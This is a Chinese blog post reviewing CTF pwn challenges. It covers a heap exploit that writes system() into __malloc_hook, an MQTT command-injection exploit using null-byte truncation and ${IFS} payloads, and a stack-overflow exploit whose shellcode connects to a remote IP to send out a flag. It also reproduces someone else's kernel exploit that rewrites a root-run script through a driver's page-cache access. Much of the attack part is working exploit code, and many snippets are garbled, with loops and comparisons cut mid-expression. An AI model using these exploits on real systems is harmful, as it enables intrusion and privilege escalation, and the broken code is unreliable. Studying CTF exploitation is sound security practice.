---
title: "DesCtf 比赛复现"
date: 2025-08-02
categories:
  - CTF
  - 比赛复现
tags:
  - CTF
  - pwn
  - heap
  - IoT
---

一共有三道题，一道堆题目，一道随机数。一个类似于物联网的题目

## second_chall
需要先写一个解密脚本拿到管理员，才能开始打堆

```c
#include 
#include 
#include 
#include 
#include 

// 【需要你从 IDA 提取并填入】256 字节的 S盒
// 提取自 byte_5020
unsigned char byte_5020[256] = {
    0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB,
    0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB,
    0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E,
    0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25,
    0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92,
    0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84,
    0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06,
    0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B,
    0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73,
    0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E,
    0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B,
    0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4,
    0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F,
    0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF,
    0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61,
    0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D
};

// 【需要你从 IDA 提取并填入】16 字节的密钥 (原代号 qword_5120)
// 提取自 qword_5120，已处理小端序
unsigned char key_5120[16] = {
    0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE, 
    0x13, 0x37, 0xC0, 0xDE, 0xFE, 0xED, 0xFA, 0xCE
};

// 还原的加密算法
void encrypt_token(unsigned char *a1) {
    int i;
    unsigned char v4;
    
    // Pass 1: XOR and S-Box
    for (i = 0; i > 5) | (a1[i]  <approx_timestamp>\n", argv[0]);
        return 1;
    }

    const char *charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    unsigned char target_cipher[16];
    unsigned char current_plain[17];
    unsigned char temp_buffer[16];
    
    // 解析目标密文
    for (int i = 0; i > ", b"1")
        p.sendlineafter(b"[*] Size: ", str(size).encode())
        p.recvuntil(b"allocated at ")
        addr = int(p.recvuntil(b" ", drop=True), 16)
        return addr

    def free(idx):
        p.sendlineafter(b">> ", b"2")
        p.sendlineafter(b"[*] Index: ", str(idx).encode())

    def edit(idx, content):
        p.sendlineafter(b">> ", b"3")
        p.sendlineafter(b"[*] Index: ", str(idx).encode())
        p.sendafter(b"[*] Content: ", content)

    def show(idx):
        p.sendlineafter(b">> ", b"4")
        p.sendlineafter(b"[*] Index: ", str(idx).encode())
        res = p.recvline()
        return res

    def debug_zero(addr):
        p.sendlineafter(b">> ", b"5")
        p.sendafter(b"[*] Enter debug data ", p64(addr))

    heap_base = add(0x18) # Index 0
    log.success(f"Heap Address leaked: {hex(heap_base)}")

    leak_line = show(-10)
    stdin_leak = int(leak_line.split(b"at ")[1].split(b" ")[0], 16)
    libc.address = stdin_leak - libc.sym['_IO_2_1_stdin_']
    
    malloc_hook = libc.sym['__malloc_hook']
    system_addr = libc.sym['system']
    log.success(f"Libc Base: {hex(libc.address)}")
    log.info(f"__malloc_hook: {hex(malloc_hook)}")

    log.info("Allocating chunks for overlapping...")
    chunk1_ptr = add(0x428) 
    chunk2_ptr = add(0x18)  
    chunk3_ptr = add(0x4F8) 
    chunk4_ptr = add(0x18) 
    fake_chunk_offset = 0x3F0
    fake_chunk_addr = chunk1_ptr + fake_chunk_offset
    
    fake_chunk = p64(0) + p64(0x51) + p64(fake_chunk_addr) + p64(fake_chunk_addr)
    
    payload = b'A' * fake_chunk_offset + fake_chunk
    edit(1, payload)

    edit(2, b'B' * 16 + p64(0x50))
    debug_zero(chunk3_ptr - 15)
    log.info("Triggering backward consolidation...")
    free(3) 
    free(0)
    free(2) 
    add(0x448) 
    aligned_target = malloc_hook - 8
    target_fd = aligned_target ^ (chunk2_ptr >> 12) 

    log.info("Poisoning Tcache...")
    payload = b'B' * 0x20 + p64(0) + p64(0x21) + p64(target_fd)
    edit(0, payload)
    add(0x18)
    add(0x18) 
    
    log.info("Writing system() to __malloc_hook...")
    edit(3, b'A' * 8 + p64(system_addr))
    
    log.success("Exploit Complete! Triggering shell via malloc...")
    
    bin_sh_addr = next(libc.search(b'/bin/sh'))
    p.sendlineafter(b">> ", b"1")
    p.sendlineafter(b"[*] Size: ", str(bin_sh_addr).encode())

    p.interactive()
```

## array
漏洞代码

```c
__int64 vuln()
{
    unsigned __int64 v1; // rbx
    _QWORD v2[17]; // [rsp+0h] [rbp-B0h] BYREF
    unsigned __int64 number1; // [rsp+88h] [rbp-28h] BYREF
    unsigned __int64 number2[3]; // [rsp+90h] [rbp-20h] BYREF

    puts("plz input your number1:");
    fflush(stdout);
    read(0, &number1, 8u);
    if ( number1  rand() % (number1 + 1) )
            {
                puts("No!");
            }
            else
            {
                puts("plz input your number2:");
                read(0, &v2[number2[0] + 1], 8u);
            }
        }
        puts("Ok");
        return 0;
    }
    else
    {
        puts("No!");
        return 0xFFFFFFFFLL;
    }
}
```

1. 在 else 分支中，有这样一行代码：

```c
read(0, &v2[number2[0] + 1], 8u);
```

number2 没有检查

校验逻辑可以无限循环

```c
if ( v1 > rand() % (number1 + 1) )
```

我们要输入22，但是22大于18。程序会退出 

失败后，程序只会打印 No，并**不会退出循环**。因为外层还有一个while get 循环，攻击者可以不断输入数据，不断进行随机数碰撞，直到随机出的数值满足条件为止。  

```c

```

## mqtt
mqtt应该是物联网里面的一种通信协议

前两道题比赛的时候看了一下，这道题当时没看

看到了了解一下

程序依赖 libpaho-mqtt3c.so.1，说明其核心通信方式是 MQTT

创建mqtt客户端：

```c
rc = MQTTClient_create(&client, p_tcp:__localhost:9999_1, "httpclient", 1, 0);
```

注册函数

```c
rc = MQTTClient_setCallbacks(client, 0, connlost, msgarrvd, delivered);
```


http里面有一个函数，可以让我们读取flag

```c
    snprintf(src, 0x80u, "cat /home/ctf/%s", s);
    n = strlen(src);
    memcpy(cmd, src, n);
    if ( !strcmp(s, "index_html") )
    {
      stream = popen(cmd, "r");
```


通过ai分析，main函数里面有限制

```c
__int64 __fastcall msgarrvd(__int64 a1, const char *a2, int a3, __int64 a4)
{
  __int64 v5; // [rsp+0h] [rbp-80h] BYREF
  int v6; // [rsp+Ch] [rbp-74h]
  const char *v7; // [rsp+10h] [rbp-70h]
  __int64 v8; // [rsp+18h] [rbp-68h]
  __int64 v9; // [rsp+28h] [rbp-58h]
  char s1[72]; // [rsp+30h] [rbp-50h] BYREF
  unsigned __int64 v11; // [rsp+78h] [rbp-8h]

  v8 = a1;
  v7 = a2;
  v6 = a3;
  v5 = a4;
  v11 = __readfsqword(0x28u);
  v9 = *(_QWORD *)(a4 + 16);
  if ( (unsigned int)__isoc99_sscanf(v9, "{\"clientid\":\"%63[^\"]\",", s1) == 1 && !strcmp(s1, "httpclient") )
  {
    MQTTClient_freeMessage(&v5);
    MQTTClient_free(v7);
    return 1;
  }
  else
  {
    http(v9);
    puts("Message arrived");
    printf("     topic: %s\n", v7);
    printf("   message: %.*s\n", *(_DWORD *)(v5 + 8), *(const char **)(v5 + 16));
    MQTTClient_freeMessage(&v5);
    MQTTClient_free(v7);
    return 1;
  }
}
```


> ### 1. `msgarrvd` 回调函数分析（路由绕过）
> 当 MQTT 客户端接收到订阅主题的消息时，会触发 `msgarrvd`。我们来看关键的参数和逻辑：
>
> + **提取 Payload：** 在 `libpaho-mqtt` 中，第四个参数 `a4` (被赋值给 `v5`) 是一个指向 `MQTTClient_message` 结构体的指针。
>     - `*(_DWORD *)(v5 + 8)`：对应结构体中的 `payloadlen`（消息长度）。
>     - `*(_QWORD *)(v5 + 16)`（代码中的 `v9`）：对应结构体中的 `payload`（实际的消息内容指针）。
>
> **绕过 **`**sscanf**`** 过滤：**
>
> 
>

```c
if ( (unsigned int)__isoc99_sscanf(v9, "{\"clientid\":\"%63[^\"]\",", s1) == 1 && !strcmp(s1, "httpclient") )
```

> 这里程序尝试将 JSON 格式的 payload 解析出 `clientid`。如果 `clientid` 刚好是 `"httpclient"`，程序就会直接释放消息并返回，**什么都不做**。
>
> **绕过方法**：非常简单。只要我们向该 Topic 发布消息时，构造的 JSON payload 里的 `clientid`**不是**`httpclient`（例如 `{"clientid":"hacker", ...}`），或者干脆不发合法的 JSON 格式，`if` 条件就会为假，从而顺利进入 `else` 分支，调用 `http(v9)`。
>

进入v9以后，就来到了我们一开始给的那个http函数里

> 1. 程序用 `snprintf` 拼接命令 `cat /home/ctf/` 和变量 `s`。
> 2. 然后严格检查 `if ( !strcmp(s, "index_html") )`。只有当 `s`**完全等于**`"index_html"` 时，才会执行 `popen(cmd, "r")`。
> 3. 如果 `s` 只能是 `"index_html"`，那么执行的命令被死死钉在了 `cat /home/ctf/index_html`，你无法直接通过注入 `; cat flag` 来改变 `s` 的值，因为那样会导致 `strcmp` 失败。
>

我们可以用/x00来截断

然后通过两次写，来让我们的cat flag指令进行

第一步我们要把

```bash
cat /home/ctf/index_html;cat${IFS}flag*${IFS}# 
```

这个写入cmd这个全局变量，不通过检查

然后第二次我们只写前面的cat /home/ctf/index_html。覆盖掉它。让它通过检查然后执行就可以

检查通过之后执行

```c
stream = popen(cmd, "r");
```

这是利用思路。我们可以调用 paho.mqtt  这样的库来帮我们写这个协议栈

不过它会自动填充一些东西，不是很好控制。我们需要学习然后自己手工去写

而且我们需要利用/00来截断，所以不能轻易使用这个库

1.  MQTT 协议的特色。MQTT 报文的“剩余长度”字段使用的是一种叫做“可变长度编码（Variable Byte Integer）”的算法。手动实现这个算法，计算出我们要发送的恶意 payload 的真实字节长度。  
2.  MQTT 协议规定，所有的字符串前面必须带上两个字节（16位）来表示这个字符串的长度。使用 `struct.pack("!H", len(s))` （大端序无符号短整型）手动拼凑这个头部。
3.     不用管什么 JSON 格式，  直接把 Topic 和我们传入的原始字节（`payload`）拼接在一起，加上报文头（`0x30` 代表 PUBLISH），然后通过最底层的 `socket.sendall()` 把这串字节流硬生生地塞进网络管道。  

### 在有的脚本中还有后台监听
**双线程并发**： 这里启动了一个后台线程，专门用来跑 `reader_loop` 函数。这样主线程在狂发恶意请求的时候，后台看着 MQTT 服务器。

```python
# 建立一个接收端的 MQTT 客户端
sub = MQTTClient(HOST, PORT)
sub.subscribe(TOPIC, qos=0)
# 开启后台守护线程监听
t = threading.Thread(target=reader_loop, args=(sub,), daemon=True)
t.start()
```

**精准截获与解析 (**`**reader_loop**`** 函数中)**： 这个循环一直在读取 Socket 数据。当它发现收到的是一个 PUBLISH 报文（`pkt_type == 3`）时，它会把 payload 剥离出来。

```python
if pkt_type != 3: # 只处理别人发布过来的消息
    continue
# ... 解析出 topic 和 payload ...
```

**过滤与Flag**： 它尝试把收到的字节流当做 JSON 解析。如果确认是服务端发来的（`clientid` 是 `"httpclient"`），就把里面的 `message` 字段提出来。 如果包含 `flag{` 或 `ctf{` 这种敏感字眼，就用 `[!!!]` 给你打印在屏幕上！

```python
obj = json.loads(txt)
if obj.get("clientid") == "httpclient": # 确认是服务端的回显
    msg = obj.get("message", "")
    print(f"[sub] httpclient => {msg}") # 打印所有回显
    # 自动化审计，发现 flag 立刻报警
    if "flag{" in msg.lower() or "ctf{" in msg.lower():
        print(f"[!!!] maybe flag => {msg}")
```

---

### 容错机制
出题人把 Flag 放在哪里，叫什么名字都是不知道的。而且这个也没有返回来显示的提示。如果一上来就去读 `/flag`，很有可能会出错。flag文件叫这个`/home/ctf/flag.txt` 就会读不出来

**精心构造的 **`**cmds**`** 列表**： 每次循环，脚本都会拿出一个命令，喂给 `trigger(cmd)` 去执行那套“两步走”的利用。（这道题）

```python
cmds = [
    "echo${IFS}PWNED",   # 第一脚踢门：如果监听线程打印出 PWNED，说明命令注入 100% 成功了！
    "echo${IFS}$PWD",    # 第二步侦察：我在哪？(通常是 /home/ctf 或者 /)
    "echo${IFS}*",       # 第三步翻箱倒柜：利用 Linux 的 * 通配符，把当前目录下的所有文件名全打印出来！
    "cat${IFS}f*",       # 第四步盲狙：读取所有以 f 开头的文件
    "cat${IFS}flag*",    # 第五步盲狙：读取所有以 flag 开头的文件
    "cat${IFS}*flag*",   # 第六步盲狙：前后夹击，只要文件名里带 flag 就全读出来
]
```

_注：使用 _`_${IFS}_`_ 是因为在 HTTP 协议和 _`_snprintf_`_ 拼接时，空格极容易导致截断或解析失败，所以用 _`_${IFS}_`_（内部字段分隔符）代替空格。_

**稳健的循环**

```python
for cmd in cmds:
    try:
        trigger(cmd) # 执行 Stage 1 (埋雷) 和 Stage 2 (引爆)
    except Exception as e:
        print("[!] error:", e) # 就算某个命令让服务端崩了一下，也不影响下一个命令继续打
```

每一次 `trigger(cmd)` 都会经历：组装带 `\x00` 的变异 HTTP 请求 -> 发送投毒 -> 等待 0.5 秒 -> 发送正常请求引爆漏洞 -> 监听线程抓取回显结果。

这样脚本在不知道环境到底是什么情况的时候，就可以通过这种方法。把flag拿出来

```python
#!/usr/bin/env python3
import socket
import struct
import threading
import time
import json
import random
import sys

HOST = sys.argv[1]
PORT = int(sys.argv[2])
TOPIC = "HTTP"

def pack_str(s):
    if isinstance(s, str):
        s = s.encode()
    return struct.pack("!H", len(s)) + s

def enc_varint(x):
    out = b""
    while True:
        b = x % 128
        x //= 128
        if x > 0:
            b |= 0x80
        out += bytes([b])
        if x == 0:
            return out

def recv_exact(sock, n):
    data = b""
    while len(data)  63:
        raise ValueError(f"payload too long ({len(inj)} > 63): {inj}")
    return f"GET /ctf/{inj} HTTP/1.1\r\n\r\n\x00".encode()

def make_stage2():
    return b"GET /ctf/index_html HTTP/1.1\r\n\r\n\x00"

def trigger(cmd):
    print("=" * 60)
    print("[+] cmd =", cmd)
    publish_once(make_stage1(cmd))
    time.sleep(0.5)
    publish_once(make_stage2())
    time.sleep(2.5)

def reader_loop(sub):
    while sub.running:
        try:
            first = recv_exact(sub.sock, 1)[0]
        except EOFError:
            break
        rem = recv_varint(sub.sock)
        body = recv_exact(sub.sock, rem)
        pkt_type = first >> 4

        if pkt_type != 3:
            continue

        off = 0
        topic, off = parse_str(body, off)
        payload = body[off:]

        try:
            txt = payload.decode("utf-8", "ignore").rstrip("\x00\r\n")
        except:
            txt = repr(payload)

        print(f"[sub] topic={topic.decode(errors='ignore')} raw={txt}")

        try:
            obj = json.loads(txt)
            if obj.get("clientid") == "httpclient":
                msg = obj.get("message", "")
                print(f"[sub] httpclient => {msg}")
                if "flag{" in msg.lower() or "ctf{" in msg.lower():
                    print(f"[!!!] maybe flag => {msg}")
        except:
            pass

def main():
    sub = MQTTClient(HOST, PORT)
    sub.connect(f"sub{random.randint(1000,9999)}")
    sub.subscribe(TOPIC, qos=0)

    t = threading.Thread(target=reader_loop, args=(sub,), daemon=True)
    t.start()

    print("[+] wait 3 seconds for heartbeat...")
    time.sleep(3)

    cmds = [
        "echo${IFS}PWNED",
        "echo${IFS}$PWD",
        "echo${IFS}*",
        "cat${IFS}f*",
        "cat${IFS}flag*",
        "cat${IFS}*flag*",
    ]

    for cmd in cmds:
        try:
            trigger(cmd)
        except Exception as e:
            print("[!] error:", e)

    print("[+] keep listening 5 seconds...")
    time.sleep(5)
    sub.running = False
    sub.close()

if __name__ == "__main__":
    main()
```

# SUctf


漏洞：


# 
### evbuffer
漏洞：

```python
unsigned __int64 __fastcall send_data_with_hostname(__int64 a1, _BYTE *a2, int recv_len, const struct sockaddr *a4)
{
  ...
  v14 = __readfsqword(0x28u);
  if ( recv_len > 0 )
  {
    a2[recv_len] = 0;
    s = malloc(0x50uLL);
    if ( s )
    {
      memset(s, 0, 0x50uLL);
      if ( inet_pton(2, a2, (char *)s + 4) )
      { 
        memcpy((void *)a1, a2, recv_len);
}
```

分析可知道

memcpy。它直接将用户输入 `a2` 复制到地址 `a1` 中，长度完全由接收到的 recv_len 决定。如果 a1 是一个位于栈上的固定大小缓冲区，且程序没有限制我们的输入长度。

程序有栈溢出。没有libc

 因为这是一个网络服务程序，如果只用bin/sh，Shell 可能会开在服务器本地，我们通过网络根本连不上。所以我们需要手写一段网络交互的 Shellcode  


那应该就是那几个串起来，ORW，泄露libc。栈溢出泄露libc和栈地址

我们最后的ORW还要放到栈上执行，所以需要用 mprotect  把权限开了。然后再执行我们的shellcode

**利用 TCP泄露 Libevent 与 Libc 地址**

当向 TCP 端口发送 `127.0.0.1\0` 并接收一段 0x50 长度的数据时，在偏移 0x48 处，残留着 `libevent` 库中的某个指针。

+ 利用公式计算基址：

Base_libevent = Addr_leak - 0x13b1a

Base_libc = Base_libevent - 0x249000

**2. 泄露栈地址（利用 UDP）**

同样的逻辑，我们向 UDP 端口发送短数据。在 UDP 处理流程的栈结构中，偏移 `0x40` 的位置残留着一个栈指针。

+ 计算出我们可控缓冲区的起始栈地址：

Addr_stack = Addr_leak - 0x3e0


倒是每个地方不是很难，就是结合起来比较复杂

```python
from pwn import *


ip = '101.245.104.190'
t_port = 10003
u_port = 10013

# 为了拿 libevent 的地址，进而算 libc
p = remote(ip, t_port)
p.send(b'127.0.0.1\0') 
data = p.recv(0x50) 
p.close()

libevent_addr = u64(data[0x48:0x48+8])
libevent_base = libevent_addr - 0x13b1a
print("find_libevent_addr: " + hex(libevent_base))


libc_base = libevent_base - 0x249000
print("calaulate_libc_addr: " + hex(libc_base))

#用 UDP 协议拿栈地址
p2 = remote(ip, u_port, typ="udp")
p2.send(b'127.0.0.1\0')
data2 = p2.recv(0x50)
p2.close()

stack_addr = u64(data2[0x40:0x40+8]) - 0x3e0
print("找到栈地址了: " + hex(stack_addr))

# 第三次正式开始攻击
p3 = remote(ip, t_port)

# 准备 Shellcode，用来读 flag
my_shellcode = asm('''
    xor esi, esi
    mul rsi
    inc esi
    mov edi, esi
    inc edi
    mov al, 41
    syscall
    mov edi, eax
    mov rbx, 0x9f0ca208c9ea0002
    push rbx
    mov rsi, rsp
    mov dl, 16
    mov al, 42
    syscall
    xor esi, esi
    mov al, 33
    syscall
    inc esi
    mov al, 33
    syscall
    inc esi
    mov al, 33
    syscall
    mov eax, 0x67616c66
    push rax
    mov rdi, rsp
    xor eax, eax
    mov esi, eax
    mov al, 2
    syscall
    push rax
    mov rsi, rsp
    xor eax, eax
    mov edx, eax
    inc eax
    mov edi, eax
    mov dl, 8
    syscall
    pop rax
    test rax, rax
    js over
    mov edi, eax
    mov rsi, rsp
    mov edx, 1024
    xor eax, eax
    syscall
    mov edx, eax
    mov rsi, rsp
    xor eax, eax
    inc eax
    mov edi, eax
    syscall
over:
    xor edi, edi
    mov eax, 60
    syscall
''', arch='amd64')


payload = b'127.0.0.1\0'
payload += b'A' * 22  
payload += p64(1)
payload += p64(stack_addr - 0x110) 

payload += p64(0) * 1 
payload += p64(stack_addr) # 0x8
payload += p64(stack_addr) # 0x10
payload += b'\0' * (0x30 - 0x18)
payload += p64(0) # 0x30
payload += b'\0' * (0x68 - 0x38)
payload += p64(stack_addr & 0xfffffffffffff000) # 0x68
payload += p64(0x1000) # 0x70
payload += p64(stack_addr + 0x100) # 0x78
payload += b'\0' * (0x88 - 0x80)
payload += p64(7) # 0x88
payload += b'\0' * (0xa0 - 0x90)
payload += p64(stack_addr + 0x1d0) # 0xa0
payload += p64(libc_base + 0x11eb20)
payload += b'\0' * (0xe0 - 0xb0)
payload += p64(stack_addr)
payload += b'\0' * (0x100 - 0xe8)
payload += p64(stack_addr + 0x100)
payload += b'\0' * 8
payload += p64(libc_base + 0x539e0) 
payload += b'\0' * 8
payload += p64(1)
payload += b'\0' * (0x1d0 - 0x128)
payload += p64(stack_addr + 0x1f0) 
payload += b'\0' * (0x1f0 - 0x1d8)
payload += my_shellcode 

print("Payload_len: " + str(len(payload)))
p3.send(payload)

p3.close()
```

### EzRouter
这直接加载出来一个路由器界面

进入后台后可以下载固件。其中有一个 http 文件。

这看不出来漏洞，不知道往哪个方向利用

### Chronos_Ring1
### Chronos_Ring
这两个是什么题，拿ai分析了说是

**Chronos_Ring** 是一道非常经典的 Linux 内核（Kernel）Pwn 题。它没有让你去构造复杂的 ROP 链或者堆溢出布局，而是侧重于对**内核语义逻辑**的理解。

这道题的核心矛盾点在于：**一个具备“修改文件 Page Cache”能力的内核驱动，撞上了一个“定期以 Root 权限执行”的脚本。**

****

**这个应该是能知道它的问题在哪的，但是不会写具体的利用脚本**

**（后面看了别人的复现，是拿c写的**

** 主要是虽然你在文件系统中没有写的权限，但驱动提供的接口允许你从内核维度强行修改该文件在内存中的映射副本。  ）**

**这里放一下别人的exp:**

```c
#include 

#define AT_FDCWD -100

#define O_RDONLY 0
#define O_RDWR 2

#define SYS_read 0
#define SYS_write 1
#define SYS_close 3
#define SYS_ioctl 16
#define SYS_nanosleep 35
#define SYS_openat 257
#define SYS_exit 60

#define CHRONOS_CREATE 0x1001
#define CHRONOS_AUTH 0x1002
#define CHRONOS_PIN_USER 0x1003
#define CHRONOS_ATTACH_FILE 0x1004
#define CHRONOS_MAKE_VIEW 0x1005
#define CHRONOS_COPY_TO_VIEW 0x1008

struct timespec {
    int64_t tv_sec;
    int64_t tv_nsec;
};

struct auth_req {
    uint64_t key;
    uint32_t seed;
    uint32_t pad;
};

struct write_req {
    uint64_t user_buf;
    uint32_t len;
    uint32_t off;
};

struct attach_req {
    int32_t fd;
    uint32_t index;
};

struct copy_req {
    uint64_t pad;
    uint32_t len;
    uint32_t off;
};

static const uint64_t auth_const = 0xf372fe94f82b3c6eULL;
static const uint64_t auth_base = 0x0ffffffff8100000ULL;
static const uint64_t auth_step = 0x20000ULL;
static const uint64_t auth_tries = 0x2000ULL;

static const char dev_path[] = "/dev/chronos_ring";
static const char job_path[] = "/tmp/job";
static const char flag_path[] = "/flag";

static const char payload[] =
    "#!/bin/sh\n"
    "chmod 644 /flag\n"
    "#\n"
    "################################";

static char scratch[0x1000];

static inline long syscall0(long nr) {
    long ret;

    __asm__ volatile(
        "syscall"
        : "=a"(ret)
        : "a"(nr)
        : "rcx", "r11", "memory");
    return ret;
}

static inline long syscall1(long nr, long a1) {
    long ret;

    __asm__ volatile(
        "syscall"
        : "=a"(ret)
        : "a"(nr), "D"(a1)
        : "rcx", "r11", "memory");
    return ret;
}

static inline long syscall2(long nr, long a1, long a2) {
    long ret;

    __asm__ volatile(
        "syscall"
        : "=a"(ret)
        : "a"(nr), "D"(a1), "S"(a2)
        : "rcx", "r11", "memory");
    return ret;
}

static inline long syscall3(long nr, long a1, long a2, long a3) {
    long ret;

    __asm__ volatile(
        "syscall"
        : "=a"(ret)
        : "a"(nr), "D"(a1), "S"(a2), "d"(a3)
        : "rcx", "r11", "memory");
    return ret;
}

static inline long syscall4(long nr, long a1, long a2, long a3, long a4) {
    long ret;
    register long r10 __asm__("r10") = a4;

    __asm__ volatile(
        "syscall"
        : "=a"(ret)
        : "a"(nr), "D"(a1), "S"(a2), "d"(a3), "r"(r10)
        : "rcx", "r11", "memory");
    return ret;
}

static inline long openat(int dirfd, const char *path, int flags, int mode) {
    return syscall4(SYS_openat, dirfd, (long)path, flags, mode);
}

static inline long close_fd(int fd) {
    return syscall1(SYS_close, fd);
}

static inline long do_ioctl(int fd, unsigned long cmd, void *arg) {
    return syscall3(SYS_ioctl, fd, cmd, (long)arg);
}

static inline long read_fd(int fd, void *buf, unsigned long len) {
    return syscall3(SYS_read, fd, (long)buf, len);
}

static inline long write_fd(int fd, const void *buf, unsigned long len) {
    return syscall3(SYS_write, fd, (long)buf, len);
}

static inline void sleep_secs(long secs) {
    struct timespec ts;

    ts.tv_sec = secs;
    ts.tv_nsec = 0;
    syscall2(SYS_nanosleep, (long)&ts, 0);
}

static inline void exit_now(int code) {
    syscall1(SYS_exit, code);
    __builtin_unreachable();
}

static unsigned long str_len(const char *s) {
    unsigned long n = 0;

    while (s[n]) {
        ++n;
    }
    return n;
}

static void write_str(int fd, const char *s) {
    write_fd(fd, s, str_len(s));
}

static void write_flag(void) {
    char buf[128];
    long fd;
    long n;
    int tries;

    for (tries = 0; tries = 0) {
            n = read_fd((int)fd, buf, sizeof(buf));
            if (n > 0) {
                write_fd(1, buf, (unsigned long)n);
                write_fd(1, "\n", 1);
                close_fd((int)fd);
                exit_now(0);
            }
            close_fd((int)fd);
        }
        sleep_secs(1);
    }

    write_str(2, "failed to read /flag\n");
    exit_now(1);
}

static void auth_ring(int fd) {
    uint64_t i;

    for (i = 0; i  MAX_SCRIPT_SIZE) {
        System.out.println("Error: script too large (max 1MB)");
        return;
    }

    // 把当前行追加到脚本内容里，并补一个换行
    script.append(line).append("\n");
}

// 创建一个 V8 JavaScript 运行时环境
V8 v8 = V8.createV8Runtime();

// 向 JS 环境注册一个名为 log 的 Java 方法
// 这样 JS 代码里就可以调用 log(...)，实际会执行这里的 Java 回调
v8.registerJavaMethod((JavaVoidCallback) (receiver, params) -> {
    // 如果传入了参数，就打印第一个参数
    if (params.length() > 0) {
        System.out.println(params.get(0).toString());
        System.out.flush();
    }
}, "log");

// 执行前面拼接好的 JS 脚本，并拿到执行结果
Object result = v8.executeScript(script.toString());
构建调试版 App

我们可以看到上述这个 app 功能很简略，我们可以重新改一下这个 app，使其具有调试的功能。

修改之后的完整的源码如下（需要同时修改 Dockerfile 和 sh 文件）：

import com.eclipsesource.v8.*;
import sun.misc.Unsafe;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.util.Locale;

public class DebugApp {
    private static final int MAX_SCRIPT_SIZE = 1048576;
    private static final Unsafe UNSAFE = getUnsafe();

    public static void main(String[] args) throws Exception {
        System.out.println("  ____  _   _ ____            ");
        System.out.println(" / || | | | __ )  _____  ");
        System.out.println(" \\ \\| | | |  _ \\ / _ \\ \\/ /");
        System.out.println("  ) | || | |) | () >   MAX_SCRIPT_SIZE) {
                System.out.println("Error: script too large (max 1MB)");
                return;
            }
            script.append(line).append("\n");
        }

        if (script.isEmpty()) {
            System.out.println("Error: empty script");
            return;
        }

        System.out.println("[*] Executing...");
        System.out.flush();

        V8 v8 = V8.createV8Runtime();

        v8.registerJavaMethod((JavaVoidCallback) (receiver, params) -> {
            if (params.length() > 0) {
                System.out.println(params.get(0).toString());
                System.out.flush();
            }
        }, "log");

        v8.registerJavaMethod((JavaCallback) (receiver, params) -> {
            Object obj = params.get(0);
            return hex(nativeHandleOf(obj));
        }, "addr");

        v8.registerJavaMethod((JavaCallback) (receiver, params) -> {
            long addr = parseAddr(params.get(0).toString());
            return hex(UNSAFE.getLong(addr));
        }, "read64");

        v8.registerJavaMethod((JavaCallback) (receiver, params) -> {
            long addr = parseAddr(params.get(0).toString());
            long value = Integer.toUnsignedLong(UNSAFE.getInt(addr));
            return hex(value);
        }, "read32");

        v8.registerJavaMethod((JavaCallback) (receiver, params) -> {
            long addr = parseAddr(params.get(0).toString());
            int size = params.length() > 1 ? parseSize(params.get(1).toString()) : 0x80;
            return dump(addr, size);
        }, "dump");

        v8.registerJavaMethod((JavaVoidCallback) (receiver, params) -> {
            long addr = parseAddr(params.get(0).toString());
            long value = parseAddr(params.get(1).toString());
            UNSAFE.putLong(addr, value);
        }, "write64");

        v8.registerJavaMethod((JavaVoidCallback) (receiver, params) -> {
            System.gc();
            System.runFinalization();
        }, "jgc");

        try {
            Object result = v8.executeScript(script.toString());
            if (result instanceof V8Object) {
                ((V8Object) result).release();
            }
        } catch (Throwable t) {
            System.out.println("Error: " + t);
            t.printStackTrace(System.out);
        } finally {
            if (!v8.isReleased()) {
                v8.release();
            }
        }
    }

    private static Unsafe getUnsafe() {
        try {
            Field f = Unsafe.class.getDeclaredField("theUnsafe");
            f.setAccessible(true);
            return (Unsafe) f.get(null);
        } catch (Exception e) {
            throw new RuntimeException("failed to get Unsafe", e);
        }
    }

